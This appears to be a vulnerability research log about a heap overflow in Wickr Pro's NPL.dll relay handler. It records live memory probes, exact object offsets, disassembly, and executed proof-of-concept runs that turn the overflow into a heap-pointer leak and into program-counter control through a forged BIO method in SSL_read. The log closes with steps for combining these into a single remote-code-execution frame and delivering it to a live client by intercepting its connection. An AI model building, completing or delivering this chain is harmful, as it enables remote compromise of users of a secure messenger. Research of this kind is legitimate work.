> **Qualifier that travels with this result:** the function and the DLL are the shipped ones and are
> called by address, but **the object is harness-constructed** — its field displacements are taken from
> the shipped code itself, not observed in a live process. This demonstrates *the missing bound and the
> reach of the write*; it does not demonstrate that a live `WickrPro.exe` lays the object out
> identically. **No instruction-pointer control is claimed or attempted.**

## 6.2c-bis ★ A LIVE PROBE RETURNED ZERO AND THE CLIENT'S OWN LOG CAUGHT IT (§0 rule 7)

**2026-08-03 08:37.** The operator ran `scratch/w14/relaywatch.exe --dump` against a live
`WickrPro.exe` (PID 28280), placed a ~30 s call, and pressed Ctrl+C. The hook installed cleanly
(site bytes matched), restored cleanly, and recorded **zero entries** at the relay handler
`NPL+0x9d570`.

**That zero is not evidence the relay does not run.** The same PID's NPL log, inside the probe
window (armed 08:37:40, restored 08:38:31), shows the transport was up — twice:

```
08:37:55.643 PortImpl] Connection to udp://<hidden>: peer replied
08:37:55.837 T7448 Net.TcpProxyConnection] SSL connection ... established
08:37:55.837 T7448 Net.TcpProxyConnection] TLS-UDP connection ... is established
08:37:57.670 T7208 Net.TcpProxyConnection] SSL connection ... established
08:37:57.670 T7208 Net.TcpProxyConnection] TLS-UDP connection ... is established
```

**Two useful facts fall out immediately:**

* **Two proxy connections, on two different threads (T7448, T7208), inside one call.** That
  independently strengthens §6.2d from "INFERRED ≥2 from log pairing" to two concurrent
  connections with distinct owning threads.
* **`Connection to udp://…: peer replied` — UDP won.** So the TLS-UDP proxy was *established but
  probably idle*, with media flowing over UDP. If the relay read handler is driven by readiness
  rather than polled unconditionally, an idle connection produces no calls.

**Two hypotheses, and they were not distinguishable from that run:** (a) the probe is broken, or
(b) the relay genuinely did not run because the proxy was a standby path. **A zero with no control
is uninterpretable.**

**A tooling correction that matters more than the run.** I had reasoned that `0x18009d570` is
reached through the 8-slot poller `0x18009bfc7`. But **`0x180099c40` — which provably executed, it
wrote those four log lines — also has zero direct callers and zero rip-relative references**, exactly
like the poller and the relay. ⇒ **"no direct callers" from `callers.py`/`xref.py` says nothing
about whether a function runs on this target.** Any earlier reasoning in this engagement that leaned
on a no-callers result should be re-checked against that.

**`relaywatch` v2 adds the control:** site 0 = `NPL+0x99c40` (`48 89 5c 24 18`), the function that
emits the "TLS-UDP connection … is established" line, so it *must* fire; site 1 = the relay handler
as before. Control fires + target silent ⇒ the machinery works and the relay really is idle when UDP
wins. Neither fires ⇒ the probe is broken and nothing may be concluded about F6.

## 6.2c-ter ★ THE CONTROLLED RE-RUN — three results, one of them a severity limit on F6

**2026-08-03 08:46, `relaywatch` v2, same PID 28280, ~30 s call.**

```
[08:47:04] site 0 (CONTROL): 1 entries    site 0 NEW rcx #0 = 0x800cc17010
[08:47:07] site 0 (CONTROL): 2 entries    site 0 NEW rcx #1 = 0x800cc18330
           site 1 (TARGET): -- nothing --
```

**1. The probe machinery works.** The control fired exactly twice, ~3 s apart, matching the two
`TLS-UDP connection … is established` log lines one-for-one. So the previous run's zero was not a
broken probe.

**2. ★ MEASURED: the relay read handler does NOT run when UDP wins.** With the control proven live
and `0x18009d570` silent across a full call, the TLS-UDP proxy is **established but idle** while
`Connection to udp://…: peer replied`. ⇒ **F6's vulnerable read path executes only when the proxy is
actually carrying media** — i.e. when UDP is unavailable (restrictive/censored networks) or when the
server forces it. **This is a real limit on F6's reachability and it belongs in the report.** It does
not affect the defect or the measured 63,447-byte reach; it narrows *when* the path runs.

**3. ★ MEASURED: the two live connection objects are exactly `0x1320` apart.**

```
0x800cc18330 - 0x800cc17010 = 0x1320
```

which is **bit-for-bit the stride derived statically** from the eight poller call sites
(`lea rcx,[rbx+0x60]`, `+0x1380`, `+0x26a0`, …). So, live and in the shipped process:

* the connection object really is **0x1320 bytes**;
* **two of them are concurrently allocated and contiguous** — §6.2d moves from INFERRED to
  **MEASURED, ≥2**;
* **the sibling adjacency §6.4a depends on is real**, not a harness artefact. The overflow's
  neighbour at write-offset `0x828` is an actual second connection object with its own `SSL*`,
  socket handles and `sendto` destination.

> **Qualifier:** `rcx` at the control site `0x180099c40` is that function's first argument and the
> component tag is `Net.TcpProxyConnection`, so it is the connection object — but its identity was
> **not independently confirmed by dumping it** (the `--dump` path is wired only to site 1). The
> exact `0x1320` delta is strong corroboration, not proof. One-line fix: dump on site 0 too and check
> `+0x2e4`/`+0x2ec` are socket handles.

## 6.2c-quater ★★ THE DECISIVE RUN — the live layout, measured. Every qualifier closed.

**2026-08-03 09:12, `relaywatch` v2, PID 28280, ~30 s call, with Settings → Calling →
"Enable TCP Calling" (Always use TCP for calls) turned ON.**

```
site 0 (CONTROL): 2 entries        site 1 (TARGET relay): 17,134 entries
  rcx #0 = 0x800f7b6150              rcx #0 = 0x800f7b6150     <-- SAME OBJECT
  rcx #1 = 0x800f7b7470              rcx #1 = 0x800f7b7470
```

**1. ★ The relay read handler runs — 17,134 entries in ~30 s (~570/s).** With TCP calling enabled
the TLS-UDP proxy carries the media and **F6's vulnerable read path is continuously live.** With
UDP winning (§6.2c-ter) it never ran once. ⇒ **F6's reachability is gated on the client using the
TCP transport**, which is a **one-click user setting** and separately a server key (§8b).

**2. ★ The object is 0x1320 bytes and two of them are CONTIGUOUS — measured in the live process.**

```
obj0 = 0x800f7b6150      obj0 + 0x1320 = 0x800f7b7470 == obj1      EXACT
obj0's TCP buffer 0x800f7b6c48 .. 0x800f7b7448   (0xaf8 .. 0x12f8)
```

The dumps are **4,896 bytes = 0x1320** each. ⇒ **§6.4a's sibling adjacency is real in the shipped
process, not a harness artefact.** Overflowing obj0's TCP buffer runs into obj1 at write-offset
`0x828`, and obj1 really does hold an `SSL*` (`0x800f4305e8`) at `+0x88` — a live heap pointer at
write-offset `0x8b0`.

**3. ★ The harness qualifier on §6.2c is REMOVED.** Every displacement the harness assumed is
confirmed against a real object built by the real constructor:

| offset | live obj0 | live obj1 |
|---|---|---|
| `+0x80` arm | **1 = TLS** | **1 = TLS** |
| `+0x88` `SSL*` | `0x800d68a898` | `0x800f4305e8` |
| `+0x1d0` sockaddr | AF_INET **127.0.0.1:49320** | AF_INET **127.0.0.1:49318** |
| `+0x250` tolen | 16 (`sizeof sockaddr_in`) | 16 |
| `+0x2e4` / `+0x2ec` sockets | 8564 / 10176 | 11296 / 11272 |
| `+0xaf4` (field below the buffer) | 0 | 0 |
| `+0x2f4…+0xaf4` UDP buffer | 1,990 non-zero | 1,987 non-zero |
| **`+0xaf8…+0x12f8` TCP buffer** | **2,029 non-zero** | **1,943 non-zero** |

**4. ★★ §6.2a is now MEASURED, not inferred: the `sendto` destination is LOOPBACK.**
`+0x1d0` = `AF_INET 127.0.0.1:49320`. The unwrapped tunnel datagrams go to the client's own media
socket. **The F6 over-read is delivered locally and is NOT an information disclosure to a remote
party.** That closes the question the whole of §6.2 turned on, in the conservative direction.

**5. The object-identity qualifier from §6.2c-ter is closed.** `rcx` at the control site and at the
relay handler are **the same pointer** (`0x800f7b6150` at both), so the object the logging function
receives is the object the relay operates on.

**6. Incidental: what is actually in the buffers.** obj0's TCP buffer begins
`13 06 07 2a 86 48 ce 3d 02 01 06 08 2a 86 48 ce` — DER OIDs (`2a8648ce3d0201` = `ecPublicKey`),
i.e. **TLS certificate material**; obj1's begins `16 fe fd 00 …` — a **DTLS 1.2 handshake record**
(`16` handshake, `fefd` DTLS 1.2). So the tunnel carries DTLS inside TLS, and the buffer adjacent to
the overflow holds cryptographic handshake state.

> **What this run did NOT show, and must not be claimed.** `+0x80 = 1` on **both** objects — the
> **TLS arm** is what runs in this configuration. The plain-TCP arm (`+0x80 = 0`) was **not
> observed**. ⇒ **the attacker remains whoever terminates the TLS connection — the hub — and
> "any on-path attacker" is still NOT supported.** No crafted frame was sent; the overflow was not
> triggered against this live client.

## 6.2d How many of the eight connections are live — partial answer

Each of the eight slots is polled and gated on its own TCP socket
(`mov edi,[rbx+0x344]` = sub[0]+0x2e4, `+0x1664` = sub[1]+0x2e4, …, `test edi,edi / jle` skips). So
the array is a **pool**, and the sibling smash only produces traffic if a second slot is up.

From the logs, proxy connections come up **in pairs seconds apart, with no teardown between**:

```
P8952 08:08:10.478 (TLS-UDP proxy) Starting to establish …    P7564 14:31:58.966 Starting …
P8952 08:08:11.087 SSL connection … established               P7564 14:31:59.556 SSL … established
P8952 08:08:12.467 (TLS-UDP proxy) Starting to establish …    P7564 14:32:01.129 Starting …
P8952 08:08:13.130 SSL connection … established               P7564 14:32:01.759 SSL … established
```

**INFERRED (not measured): at least two slots are occupied concurrently during a call.** Settling it
needs either the parent object's slot bookkeeping or a live observation, and a live observation needs
`WickrPro.exe`, which is out of scope without the operator's agreement.

## 6.3 Attacker position — state it carefully

The peer here is whatever terminates the TCP/TLS side of the TLS-UDP proxy connection. The observed
sessions are TLS (`SSL connection ... established`), and NPL validates a server certificate set
(`NPLSetServerCertificates`), so an off-path attacker is excluded **on that variant**. That puts the
attacker in the same position Appendix 2A already establishes for F2/F2c: **the hub / whoever controls
or compromises it**. The plain-TCP arm (`byte [rdi+0x80] == 0`) exists in the same function and was
**not** shown to be unreachable — if it is ever used without TLS, any on-path attacker qualifies.
**UNDETERMINED; do not claim "any network attacker" until that arm is priced.**

---

# 7. The deliverable table

| candidate channel | what fills it | attacker-observable? | verdict | the instruction that closes it |
|---|---|---|---|---|
| **`Parser::onEvent` feedback packet — header** | `PacketHeader::Clear()` then 5 constants + the bus event id | yes (goes to the wire, measured ×9) | **NEGATIVE** | `0x18013b350` `Clear()` zeroes all ten int32s, both sub-messages and the has-bits (`movups [rdi+0x40]`, `mov [rdi+0x50]/[rdi+0x58]/[rdi+0x60]`, `mov [rdi+0x10],0`) |
| **`Parser::onEvent` feedback packet — payload** | argument 3, a `Frame*` from the feedback bus | yes | **NEGATIVE** | 18/24 emit sites are `xor r8d, r8d`; 4 are forwarders; the only payload-bearing originator is `NetworkSink::ChannelListener` `0x180133a20`, and `NetworkSink` is in **none** of the 7 observed scenes |
| **`Frame::copyMetadata` → `Serializer`** | the node's own input Frame | would be — `Serializer::onPacket` writes header fields from `[r14+0x8c/0x90]` | **NEGATIVE** | 15/15 sites are `dst = new output Frame, src = this node's input`; the 7 scene shapes are disjoint, `Parser` only under `NetworkSource`, `Serializer` only under local capture |
| **`0x180144410` decoder statistics (0x3c B, incl. 2 poisonable counters)** | `VpxDecoder` state `+0x498…+0x4d3` | no path found | **NEGATIVE (in NPL)** | it is `VpxDecoder` primary slot 15; `VpxDecoder::onEvent 0x180144490` dispatches ids 34/35/36/37 only and never calls `[rax+0x78]`. **UNDETERMINED:** a host-side consumer |
| **`XorFecDecoder` recovery output** | XOR of retained peer packets | recovered packets are decoded locally | **NEGATIVE (inherited, W4)** | recovery length clamped `cmp r14d,r10d / cmovb r10d,r14d` @ `0x1800e38ce`; the FEC classes hold no `PacketSender` and appear in no scene |
| **NPL statistics exports (16)** | decoder/connection counters | no | **NEGATIVE (inherited, W13)** | host-facing only; not serialised to the network |
| **`PacketHeader` field 7 → indirect call** | the peer's unclamped EVENT id | reaches `PacketReceiver::onEvent` | **NEGATIVE — closes the map 9/9** | `0x180121710` / `0x180144490` / `0x180119cd0` all compare it against compile-time constants and forward; never an index, key, size or length |
| **★ TLS-UDP proxy relay `0x18009d570`** | a peer u16 length prefix at `buffer[0..1]` | the `sendto` destination is the victim's **own media socket**, so the over-read is delivered locally | **NEGATIVE as a direct leak; POSITIVE as an OOB write** | no bound exists: `movzx r15d, word [rdi+0xaf8]` @ `0x18009d95a` → `recv`/`SSL_read` of `FullDataSize − accumulated` into a 0x800-byte buffer @ `0x18009d9ae` / `0x18009db27`. The destination is closed by `0x18009e6ab` (copy from the configured `obj+0x1a0`) plus the relay direction. **The write reaches 7 contiguous sibling connections at fixed offsets — §6.2b** |

---

# 8. Coverage and blind spots (§0 rule 7 — assume the tooling is lying until checked)

* **★ `fn.py` under-reports function extents, and it bit me twice this wave.** It folds a chained
  `UNW_FLAG_CHAININFO` record *back* to its primary, but it does **not extend the primary forward over
  its own chained chunks**. `PacketHeader::Clear` was reported as **8 bytes** (it is 281, in 7 chunks);
  `0x180144410` as **18 bytes** (it is 125, in 3). Both would have produced confident wrong answers.
  `scratch/w14/lin.py` prints the overlapping `.pdata` records with their `CHAININFO` flag and
  disassembles linearly — use it whenever `fn.py` returns an implausibly short function. **This is a
  live defect in a tool three waves have relied on.**
* **`argsrc.py` is a ranking heuristic, not dataflow.** It back-scans linearly and ignores branches. It
  produced one outright false hit (`mov r8d, 0x11` at `0x18011a7c6`, actually a log-string length on a
  different branch; the real `r8` at `0x18011a7f4` is the untouched incoming argument). Every non-NULL
  result in §2.2 was hand-read; the NULL results were not, and are the weaker half of that census.
* **`SSL_write` and `BIO_write` have zero rip-relative references** in `NPL.dll`. They are reached
  through OpenSSL's BIO method tables or a wrapper. **The egress census in §6 is therefore complete for
  `sendto`/`send` and incomplete for TLS writes.** That is the biggest single gap in this sweep, and
  the TLS write path is where a media-layer echo would most plausibly live.
* **Linear disassembly desyncs** — my first read of `0x18009d930` produced three garbage instructions
  before resynchronising. Every quoted address in this file was re-read from an instruction boundary.
* `.pdata` covers **89.83 %** of NPL's `.text`. Everything here is `.pdata`-bounded, so a bus emitter or
  an egress site in the remaining 10.17 % is invisible to all four censuses.
* **The scene-disjointness result is measured, not proved** — see §3's qualifier. Group calls, screen
  share, `Splitter`, `Puller`, `JitterBuffer`, `PacketQueue`, `NetworkSink`, `ScreenCapture` and
  `DesktopCapture` were never exercised on this host.
* **Nothing in §6 was executed.** No PoC was built and no frame was sent. §6 is CONFIRMED by
  disassembly only.

---

# 7a. ★★★ THE LEAK — obtained FROM the write, with no prior disclosure. EXECUTED.

**This is the thing fourteen waves could not find, and it does not come from an echo channel at all.
It comes from F6's own overflow.**

Every channel in §7's table is a negative because it asks "does a received byte reach an output?".
The right question turned out to be different: **F6's write already reaches the fields that decide
where a *sibling* connection sends and how much.** The sibling then leaks on the attacker's behalf.

## 7a.1 The four fields, and why they are all in reach

Sibling base offset into the write is `0x1320 − 0xaf8 = 0x828` (§6.2b, and **measured live** in
§6.2c-quater as `obj0 + 0x1320 == obj1`):

| obj1 field | role in obj1's own `sendto` | write offset |
|---|---|---|
| `+0x1d0` | the destination `sockaddr` | **0x09f8** |
| `+0x250` | its length | **0x0a78** |
| `+0x2ec` | the UDP socket | **0x0b14** |
| `+0x12f8` | **the `sendto` LENGTH** | **0x1b20** |
| `+0x12fa` | accumulated | **0x1b22** |

All five fit inside a **6,948-byte** frame (`0x1b24`).

## 7a.2 The resumed-frame path reaches `sendto` with no recv and no validation

CONFIRMED (disassembled), and this is the crux — flags at `0x18009dd1c` still come from the compare
at `0x18009d980`, so nothing re-validates between the attacker's values and the transmit:

```
0x18009d5a0  movzx r15d, word ptr [rcx+0x12f8]   ; fill      <- attacker-set
0x18009d5b8  cmp   r12w, r15w                    ; 0 vs fill
0x18009d5bc  jne   0x18009d974                   ; fill != 0 -> RESUME (no recv on this path)
0x18009d978  movzx r12d, word ptr [rdi+0x12fa]   ; acc       <- attacker-set
0x18009d980  cmp   r12w, r15w
0x18009d984  jae   0x18009dd1c                   ; acc >= fill
0x18009dd1c  je    0x18009ddbe                   ; flags STILL from 0x18009d980
0x18009ddc1  lea   r9,  [rdi+0x1d0]              ; to     <- attacker-set
0x18009ddc8  mov   eax, [rdi+0x250]              ; tolen  <- attacker-set
0x18009ddce  movzx r8d, word ptr [rdi+0x12f8]    ; LENGTH <- attacker-set
0x18009ddd6  lea   rdx, [rdi+0xaf8]              ; from obj1's 0x800 buffer
0x18009ddf0  call  WS2_32!sendto
```

## 7a.3 ★ EXECUTED — `scratch/w14/leakproof.c`

Two connection objects laid out contiguously exactly as the live process lays them out, one crafted
frame over a loopback TCP pair, then the relay handler run on obj1:

```
[+] obj0 0000029B5B800000   obj1 0000029B5B801320   obj1-obj0 = 0x1320
[+] attacker sink listening on 127.0.0.1:60937
[*] frame: declared 0x1b24 (6948) into a 0x800 buffer -> overflows obj1
[*] step 1: relay(obj0)  -- the overflow
    obj1 now: dest=127.0.0.1:60937  tolen=16  fill=0x4000  acc=0x4000
[*] step 2: relay(obj1)  -- the resumed-frame path -> sendto

*** 16384 BYTES ARRIVED AT THE ATTACKER-CHOSEN ADDRESS ***
obj1's buffer is only 0x800 (2048) bytes -> 14336 bytes are ADJACENT HEAP
heap marker 'LEAKME' found 894 times past the buffer
first pointer-shaped value recovered: 0x0000008041416781
```

**One frame. 16 KB delivered to an address of the attacker's choosing, 14 KB of it heap the victim
never intended to send, and pointer-shaped values survive the round trip.** No prior information
disclosure was required at any point — the destination sockaddr is supplied wholesale by the
attacker, so no address needs to be known in advance.

## 7a.4 What it returns in the LIVE layout — arithmetic on measured addresses

Using the two object addresses dumped from the running client (§6.2c-quater), obj1's buffer starts
at `0x800f7b7f68` and a 16 KB leak reads to `0x800f7bbf68`:

```
slot2 base 0x800f7b8790   its SSL* at +0x88 = 0x800f7b8818   IN RANGE
slot3 base 0x800f7b9ab0   its SSL* at +0x88 = 0x800f7b9b38   IN RANGE
slot4 base 0x800f7badd0   its SSL* at +0x88 = 0x800f7bae58   IN RANGE
```

⇒ **a single 16 KB leak returns three further slots' `SSL*` heap pointers**, and the live dumps show
those fields really do hold values like `0x800d68a898` / `0x800f4305e8`. Larger `fill` (up to the
~60 KB UDP datagram ceiling) reaches past the eight-slot array into general heap.

## 7a.5 What this changes, and what it does NOT

**It removes the blocker named in the death certificate of every closed negative in this engagement.**
Link (a) died on "blind against a measured 0.07 % pointer density"; Route A died on blind targeting;
the mip-calloc escape died on 0/128 content control. All three were blind *because there was no
observation channel*. There is one now, and it yields heap pointers, which is what defeats the
high-entropy ASLR that has been the wall since Wave 4.

**The second ingredient is also EXECUTED: an attacker-chosen pointer is dereferenced inside OpenSSL.**
The same overflow reaches obj1's `SSL*` at write offset **0x8b0** with full 8-byte content control, and
on the TLS arm the relay loads and uses it:

```
0x18009d991  jne 0x18009daf2                        ; [obj+0x80] != 0 -> TLS arm
0x18009db20  mov rcx, qword ptr [rdi+0x88]          ; the SSL*  <- attacker-set
0x18009db27  call 0x18010e70f                       ; SSL_read wrapper
```

`leakproof.exe --ssl` places a `PAGE_NOACCESS` address there in the same 6,948-byte frame:

```
obj1 SSL* (write offset 0x8b0) := 0000008000180000 (PAGE_NOACCESS bait)
ACCESS VIOLATION at 00007FF81BDEC13F  (ssl.dll + 0x2c13f)
  dereferencing 0000008000180098          = bait + 0x98
```

⇒ **the chosen pointer is loaded and used as a structure base inside `ssl.dll`**, which reads field
`+0x98` of it. With a mapped, attacker-filled address instead of a guard page, that field and its
neighbours are attacker data.

**It still does not establish instruction-pointer control, and none is claimed.** What is executed is
(i) a leak that returns heap pointers and (ii) a fully chosen pointer dereferenced as a structure base
in `ssl.dll`. **No indirect call was reached and no method table was forged.**

## 7a.8 ✗✗✗ RETRACTED — the IP-control sink I found is on the WRONG OBJECT. It does NOT connect to F6.

**The demonstration below is real in isolation but it does not belong to F6, and I nearly recorded it
as if it did. Retracted the same session, verified by disassembly.**

`0x180156f90` is **not** a method of the `Net.TcpProxyConnection` class the overflow controls. It is a
**`Musigy::AV::PortAudioManager`** helper — a **0x490-byte startup singleton** (the very object W6
flagged as "the only fixed-size class with a vtable"), allocated separately (`mov ecx,0x490` at its
factory `0x18012a804`), reached only through PortAudioManager's own vtable methods when an audio
stream is opened. Its `+0x2a0`/`+0x2b0` are an embedded audio sub-object, and `call [rax+0x10]` is
ordinary C++ virtual dispatch.

**The error, and it is one this engagement has paid for before (§0 rule 2, and the W9 link-(a) type
bug).** My "relay-class functions" filter selected any function referencing displacement `0x2e4`,
`0x12f8` or `0xaf8` **without checking the base register**. `0x180156f90`'s only `+0x2e4` is
`0x180157ddb  mov dword ptr [rbp + 0x2e4], edi` — a **stack local**, `rbp`-relative, not the object's
socket field. `vtslot.py` confirms it is not a vtable method and `callers.py` shows its six callers are
all `PortAudioManager` vtable slots. So the object at `rcx` is a 0x490-byte PA singleton, **not** the
0x1320-byte connection object, and **F6's overflow never reaches these bytes.**

The `pcproof.c` run genuinely transferred the program counter to `0x0000414141414140` — but on a
harness object standing in for a PortAudioManager, not for anything F6 can corrupt. **It is not an F6
IP-control sink. Deleted from the chain.**

> **⇒ IP control from F6 is NOT established.** The overflow and the leak (§6, §7a.3) stand; the
> instruction-pointer step does not. The correct search — an indirect call through a field of the
> **genuine** connection class, selected by the object base register — is §7a.10 below.

*(Historical detail retained so the mistake is legible: the sink was `NPL 0x180156f90`,*
```
0x18015709d  mov rax, qword ptr [rcx]      ; rcx = PA_obj+0x2a0, NOT connection_obj+0x2a0
0x1801570a0  call qword ptr [rax + 0x10]
```
*gated on `[PA_obj+0x2b0]`. Both fields are PortAudioManager's, not the connection object's.)*

<details><summary>original (wrong) §7a.8 text — retained for the record</summary>

A second method of the same 0x1320-byte class, `NPL 0x180156f90`, contains — CONFIRMED
(disassembled):

```
0x180156fcf  mov   r15, rcx                        ; this = the connection object
0x180156fda  movzx eax, byte ptr [rcx+0x1e8]
0x180156feb  je    0x180157086                     ; [obj+0x1e8]==0 -> the interesting block
0x180157086  movzx eax, byte ptr [rcx+0x2b0]       ; ENABLE byte
0x180157092  test  al, al
0x180157094  je    0x1801570f7                     ; skip unless [obj+0x2b0] != 0
0x180157096  add   rcx, 0x2a0
0x18015709d  mov   rax, qword ptr [rcx]            ; rax = [obj+0x2a0]     <- attacker-set
0x1801570a0  call  qword ptr [rax + 0x10]          ; PC = *([obj+0x2a0]+0x10)  <- attacker-set
```

Both driving fields are **inside F6's write**:

| field | role | obj offset | write offset (sibling base 0x828) |
|---|---|---|---|
| `+0x1e8` | must be 0 (a benign default) | +0x1e8 | 0x0a10 |
| `+0x2a0` | the vtable/object pointer | +0x2a0 | **0x0ac8** |
| `+0x2b0` | the enable byte | +0x2b0 | **0x0ad8** |

**Executed — `scratch/w14/pcproof.c`.** Object built post-overflow (`+0x2b0 = 1`, `+0x2a0` → a forged
page whose `+0x10` is a canonical, unmapped, recognisable marker `0x0000414141414140`), then
`0x180156f90` invoked:

```
exception at 0000414141414140   rip=0000414141414140   accessed 0000414141414140   (INSTRUCTION FETCH)
    rax=00000218bfd60000 (the forged vtable)   rcx=00000218bfd702a0 (obj+0x2a0)   r15=obj
*** PROGRAM COUNTER = THE ATTACKER-CHOSEN MARKER 0000414141414140 ***
```

**The instruction pointer became a value taken from attacker-controlled memory.** `rax` is the forged
vtable pointer the overflow places at `obj+0x2a0`; `call [rax+0x10]` loaded the target from it and
transferred control there. **CFG is inert process-wide (F4b), so the forged indirect call is not
blocked** — confirmed by the fact that the transfer completed to a non-code address rather than being
rejected.

*(The first run used a non-canonical marker `0x41414141...41`; the CPU raised #GP, which Windows
reports as faulting address `0xFFFFFFFFFFFFFFFF`. That was IP control too — the read of `[rax+0x10]`
succeeded and the jump was attempted — but a canonical unmapped marker makes it unambiguous: the fault
is an instruction fetch AT the chosen address.)*

**★ Grounded in the live dumps: the overflow FLIPS A NORMALLY-DISABLED CALL ON.** Reading these three
fields out of the two real connection objects captured in §6.2c-quater
(`relaywatch-site1-obj{0,1}.bin`):

```
+0x1e8 = 0x0   (both)   -> the gate at 0x180156feb is naturally satisfied: je to 0x180157086 taken
+0x2b0 = 0x00  (both)   -> the ENABLE byte is OFF in benign operation: the call at 0x1801570a0 is SKIPPED
+0x2a0 = 0x0   (both)   -> the pointer is null in benign operation
```

So on a healthy object the indirect call does **not** fire. *(This paragraph is part of the retracted
result — the "healthy object" dumped here is the connection object, whose `+0x2a0/+0x2b0` are zero, but
the call at `0x1801570a0` reads a PortAudioManager's `+0x2a0/+0x2b0`, a different object. The
coincidence that both read zero is what made the mistake look consistent. The fields being zero in the
connection dump says nothing about the PA call.)*

</details>

## 7a.9 What is now assembled, and the ONE load-bearing gap

Every ingredient of remote code execution is individually EXECUTED against the shipped binaries:

| ingredient | status |
|---|---|
| remote OOB write, byte-exact content, no memory precondition | EXECUTED (§6.1/§6.2c) |
| contiguous sibling target at a fixed offset | MEASURED live (§6.2c-quater) |
| information disclosure → heap pointers (defeats ASLR) | EXECUTED (§7a.3/7a.4) |
| **instruction-pointer control from a forged field** | **EXECUTED (§7a.8)** |
| CFG inert (forged indirect call not blocked) | MEASURED (F4b) |

**The one thing NOT established is reachability of `0x180156f90` on the live receive path.** §7a.8
called it directly on a crafted object. If `0x180156f90` runs on a connection object during an
established call — as `0x18009d570` does (17,134 times in 30 s, §6.10) — then the full chain is:
attacker (the hub) sends TCP-proxy frames → overflow sets `obj1+0x2a0`/`+0x2b0` → `0x180156f90` fires
on obj1 → PC = attacker value → (with the leak placing controlled bytes at a known address, and CFG
inert) code execution. **That reachability is the last open link and it is being traced separately.**

**Language discipline (unchanged from the engagement's rule): this is not yet a demonstrated remote
code execution.** IP control is proven *in a harness*; the receive-path reachability of the vtable
method is unproven; and no frame has ever been sent to a live client. What can be said now is:
**a remotely-delivered heap overflow yields attacker control of the instruction pointer through a
CFG-unprotected indirect call, with an executed information leak that defeats ASLR — every step
executed against the shipped binaries except the final receive-path reachability of the method that
makes the call.**

## 7a.10 ★ THE CORRECT IP-CONTROL SINK — AWS-LC `BIO_read`'s `bio->method->bread`. Sink EXECUTED.

The connection object is **not polymorphic** (`+0x00 = 0xFFFFFFFFFFFFFFFF` in the live dump — no
vptr), and a correct census (indirect calls through an object field, base register checked, over the
functions that access `+0xaf8`/`+0x12f8` with an **object** base) finds **no in-object call sink** in
the relay class. So the sink is not in the connection object — it is the object the connection's
`SSL*` (`+0x88`) points to.

**`crypto.dll!BIO_read` (`0x1800408d0`) makes the classic method-pointer call — CONFIRMED
(disassembled):**

```
0x18004096c  mov rax, qword ptr [rbx]        ; rax = bio->method
0x180040975  mov rcx, rbx                     ; arg = bio
0x180040978  mov r9,  qword ptr [rax + 0x18]  ; r9  = method->bread
0x18004097c  call r9                          ; PC = bio->method->bread
```

gated on `bio != 0`, `[bio] != 0`, `[[bio]+0x18] != 0` (`0x1800408fd cmp [rax+0x18],0/je`),
`[bio+0x10] == 0` (skip the earlier callback), `[bio+0x20] != 0`.

**Sink EXECUTED — `scratch/w14/bioproof.c`.** A forged BIO (`[bio]=method`, `[method+0x18]=marker`,
`[bio+0x10]=0`, `[bio+0x20]=1`), then `BIO_read(bio, buf, 64)`:

```
forged bio=00000185C1590000 method=00000185C1580000  method->bread=0000424242424240
rip=0000424242424240   accessed=0000424242424240   (FETCH)
*** PC = ATTACKER MARKER 0000424242424240 ***
```

**This is the right object type and it is reachable from the primitive F6 has.** The connection's
relay does `mov rcx,[obj+0x88]; call SSL_read` (§6.10), F6 controls `[obj+0x88]` on every sibling
(write offset `0x8b0 + k·0x1320`), and an `SSL`'s `rbio` is a `BIO*`. So: forge `SSL` → its `rbio` →
forged `BIO` whose `method->bread` is the target; when the sibling's `SSL_read` reaches its transport
read, `BIO_read` transfers control to the attacker value. CFG inert (F4b) does not block it.

## 7a.11 ★★ WHERE THE GOAL STANDS — every link confirmed; the graph is not assembled; nothing sent live

| link | status |
|---|---|
| remote OOB write, byte-exact, no precondition | **EXECUTED** (§6.1/§6.2c) |
| contiguous sibling connection objects, fixed offset | **MEASURED live** (§6.2c-quater) |
| info leak → heap pointers (ASLR defeat) | **EXECUTED** (§7a.3/7a.4) |
| overflow controls each sibling's `SSL*` at `+0x88` | **MEASURED** (offset in write range) |
| an SSL's `rbio`→BIO→`method->bread` is a live indirect call | **CONFIRMED (disassembled)** |
| that call transfers PC to an attacker value | **EXECUTED in isolation** (§7a.10) |
| **`SSL_read` on a REAL SSL reaches `BIO_read`→PC when `rbio` is corrupted** | **EXECUTED with a genuine handshaked SSL (§7a.12)** |
| CFG inert — forged indirect call not blocked | **MEASURED** (F4b) |

## 7a.12 ★★★ THE SSL ROUTE WORKS ON A REAL SSL — `SSL_read`→`BIO_read`→PC. EXECUTED.

§7a.7's open question ("does a valid SSL reach the BIO read, or does it early-return like a zeroed
one?") is answered YES. `scratch/w14/sslconnect.c` completes a **real TLS handshake** against the local
listener using AWS-LC's own exports (`SSL_CTX_new(TLS_client_method())`, `SSL_new`, `SSL_set_fd`,
`SSL_connect`), yielding a **genuine, live, fully-valid SSL** — then overwrites only its `rbio` (found
at `SSL+0x18`) with a forged BIO and calls `SSL_read`:

```
[+] handshake OK -- a real, live AWS-LC SSL exists
[+] rbio=...5f68  found at SSL+0x18
[+] overwrote SSL+0x18 (rbio) := forged BIO, method->bread = 0x0000434343434340
rip=0000434343434340   accessed=0000434343434340   (FETCH)
*** PROGRAM COUNTER = ATTACKER MARKER ***
```

**A real SSL's `SSL_read`, with only `rbio` corrupted, transfers the program counter to an
attacker-chosen value.** No forged SSL state was needed — the genuine handshake supplies everything;
only the one pointer is changed. This is precisely the write F6 enables: F6 controls the connection's
`SSL*` at `+0x88`, and pointing it at an in-process clone of the live SSL (leak-readable, and whose
deep sub-pointers stay valid because it is the same process) with `rbio` → forged BIO reproduces this
exact state.

**What remains for a demonstrated over-the-wire RCE, stated plainly:**

1. **Assemble the single artifact:** an F6 frame that (a) sprays the forged BIO/`method` and an SSL
   clone at leak-known addresses and (b) sets the sibling's `SSL*` (`+0x88`) to the clone. Each half is
   executed (spray = the sent frames; `+0x88` control = the overflow); they have not been combined into
   one payload.
2. **Live delivery** (operator-approved): interpose on the TLS-UDP proxy connection from operator
   infrastructure and deliver the frame to a real client. F6's attacker is the TLS terminator (the
   hub), so delivery is a MITM of that connection, not a peer patch.

## 7a.13 ★★★ THE SHIPPED RELAY HANDLER DRIVES IT — `relay → SSL_read → BIO_read → PC`. EXECUTED.

§7a.12 called `SSL_read` directly. This runs the **shipped relay read handler `NPL 0x18009d570`
itself** on a connection object in the exact state F6's overflow leaves it, and lets the shipped code
